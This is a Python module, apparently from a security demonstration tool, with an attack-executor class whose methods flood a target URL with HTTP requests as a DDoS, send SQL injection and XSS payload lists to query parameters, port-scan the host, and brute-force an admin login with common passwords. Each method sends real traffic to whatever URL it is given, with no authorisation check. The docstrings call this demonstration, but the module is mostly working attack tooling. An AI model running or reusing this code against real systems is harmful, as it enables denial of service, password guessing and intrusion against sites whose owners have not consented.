"""
Real Attack Executor Module
Executes actual attacks for demonstration purposes
"""

import asyncio
import aiohttp
import httpx
import socket
import time
from typing import Dict, Any, Optional, List
from urllib.parse import urlparse
import random
import string


class AttackExecutor:
    """Executes real attacks for research and demonstration"""
    
    def __init__(self):
        self.active_attacks: Dict[str, bool] = {}
    
    async def execute_ddos(self, target_url: str, intensity: int, duration: int) -> Dict[str, Any]:
        """Execute real DDoS attack"""
        if not target_url:
            raise ValueError("Target URL is required for DDoS attack")
        
        parsed_url = urlparse(target_url)
        host = parsed_url.netloc or parsed_url.path
        port = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)
        
        requests_sent = 0
        successful_requests = 0
        failed_requests = 0
        start_time = time.time()
        
        # Calculate requests per second based on intensity
        requests_per_second = intensity * 10  # Scale: 1-10 intensity = 10-100 req/s
        
        create_log("INFO", "ATTACK", f"DDoS attack started on {target_url}", {
            "intensity": intensity,
            "duration": duration,
            "rps": requests_per_second
        })
        
        async with httpx.AsyncClient(timeout=5.0, verify=False) as client:
            while time.time() - start_time < duration:
                tasks = []
                for _ in range(requests_per_second):
                    tasks.append(self._make_request(client, target_url))
                
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                for result in results:
                    requests_sent += 1
                    if isinstance(result, Exception) or result is False:
                        failed_requests += 1
                    else:
                        successful_requests += 1
                
                await asyncio.sleep(1)  # Wait 1 second before next batch
        
        return {
            "requests_sent": requests_sent,
            "successful_requests": successful_requests,
            "failed_requests": failed_requests,
            "duration": time.time() - start_time,
            "average_rps": requests_sent / (time.time() - start_time) if (time.time() - start_time) > 0 else 0
        }
    
    async def _make_request(self, client: httpx.AsyncClient, url: str) -> bool:
        """Make a single HTTP request"""
        try:
            response = await client.get(url, follow_redirects=True)
            return response.status_code < 500
        except Exception:
            return False
    
    async def execute_sql_injection(self, target_url: str, intensity: int, duration: int) -> Dict[str, Any]:
        """Execute SQL injection attack attempts"""
        if not target_url:
            raise ValueError("Target URL is required for SQL injection attack")
        
        sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL, NULL--",
            "1' OR '1'='1",
            "1' AND '1'='1",
            "1' AND '1'='2",
        ]
        
        attempts = 0
        detected = 0
        vulnerable = 0
        start_time = time.time()
        
        async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
            while time.time() - start_time < duration:
                for payload in sql_payloads[:intensity]:
                    attempts += 1
                    try:
                        # Try different injection points
                        test_urls = [
                            f"{target_url}?id={payload}",
                            f"{target_url}?user={payload}",
                            f"{target_url}?search={payload}",
                        ]
                        
                        for test_url in test_urls:
                            response = await client.get(test_url, follow_redirects=True)
                            
                            # Check for SQL error patterns
                            error_patterns = [
                                "sql syntax",
                                "mysql_fetch",
                                "ORA-",
                                "PostgreSQL",
                                "SQLite",
                                "Warning: mysql",
                                "Microsoft OLE DB",
                            ]
                            
                            response_text = response.text.lower()
                            if any(pattern in response_text for pattern in error_patterns):
                                vulnerable += 1
                                detected += 1
                            elif response.status_code == 500:
                                detected += 1
                    except Exception as e:
                        pass
                    
                    await asyncio.sleep(0.5)
        
        return {
            "attempts": attempts,
            "detected": detected,
            "vulnerable": vulnerable,
            "duration": time.time() - start_time
        }
    
    async def execute_port_scan(self, target_url: str, intensity: int, duration: int) -> Dict[str, Any]:
        """Execute port scanning attack"""
        if not target_url:
            raise ValueError("Target URL is required for port scan")
        
        parsed_url = urlparse(target_url)
        host = parsed_url.netloc or parsed_url.path.split('/')[0]
        
        # Remove port if present
        if ':' in host:
            host = host.split(':')[0]
        
        common_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5432, 5900, 8080]
        ports_to_scan = common_ports[:intensity * 2]  # Scale with intensity
        
        open_ports = []
        closed_ports = []
        filtered_ports = []
        start_time = time.time()
        
        for port in ports_to_scan:
            if time.time() - start_time > duration:
                break
            
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((host, port))
                
                if result == 0:
                    open_ports.append(port)
                else:
                    closed_ports.append(port)
                
                sock.close()
            except Exception:
                filtered_ports.append(port)
            
            await asyncio.sleep(0.1)
        
        return {
            "host": host,
            "open_ports": open_ports,
            "closed_ports": closed_ports,
            "filtered_ports": filtered_ports,
            "total_scanned": len(ports_to_scan),
            "duration": time.time() - start_time
        }
    
    async def execute_brute_force(self, target_url: str, intensity: int, duration: int) -> Dict[str, Any]:
        """Execute brute force attack simulation"""
        if not target_url:
            raise ValueError("Target URL is required for brute force attack")
        
        common_passwords = [
            "password", "123456", "password123", "admin", "root",
            "12345678", "qwerty", "abc123", "monkey", "1234567",
            "letmein", "trustno1", "dragon", "baseball", "iloveyou",
            "master", "sunshine", "ashley", "bailey", "passw0rd"
        ]
        
        attempts = 0
        blocked = 0
        start_time = time.time()
        
        async with httpx.AsyncClient(timeout=5.0, verify=False) as client:
            while time.time() - start_time < duration:
                for password in common_passwords[:intensity * 2]:
                    attempts += 1
                    try:
                        # Simulate login attempt
                        response = await client.post(
                            target_url,
                            json={"username": "admin", "password": password},
                            follow_redirects=False
                        )
                        
                        if response.status_code == 429 or response.status_code == 403:
                            blocked += 1
                        elif response.status_code == 200:
                            # Potential success (in real scenario, check response content)
                            pass
                    except Exception:
                        pass
                    
                    await asyncio.sleep(0.2)
        
        return {
            "attempts": attempts,
            "blocked": blocked,
            "duration": time.time() - start_time
        }
    
    async def execute_xss(self, target_url: str, intensity: int, duration: int) -> Dict[str, Any]:
        """Execute XSS attack attempts"""
        if not target_url:
            raise ValueError("Target URL is required for XSS attack")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
        ]
        
        attempts = 0
        detected = 0
        vulnerable = 0
        start_time = time.time()
        
        async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
            while time.time() - start_time < duration:
                for payload in xss_payloads[:intensity]:
                    attempts += 1
                    try:
                        test_urls = [
                            f"{target_url}?q={payload}",
                            f"{target_url}?search={payload}",
                            f"{target_url}?input={payload}",
                        ]
                        
                        for test_url in test_urls:
                            response = await client.get(test_url, follow_redirects=True)
                            
                            # Check if payload is reflected in response
                            if payload in response.text:
                                vulnerable += 1
                                detected += 1
                            elif response.status_code == 400 or response.status_code == 403:
                                detected += 1
                    except Exception:
                        pass
                    
                    await asyncio.sleep(0.5)
        
        return {
            "attempts": attempts,
            "detected": detected,
            "vulnerable": vulnerable,
            "duration": time.time() - start_time
        }


# Global instance
attack_executor = AttackExecutor()

# Import create_log function (will be set from main.py)
create_log = None

def set_log_function(log_func):
    """Set the log function from main module"""
    global create_log
    create_log = log_func

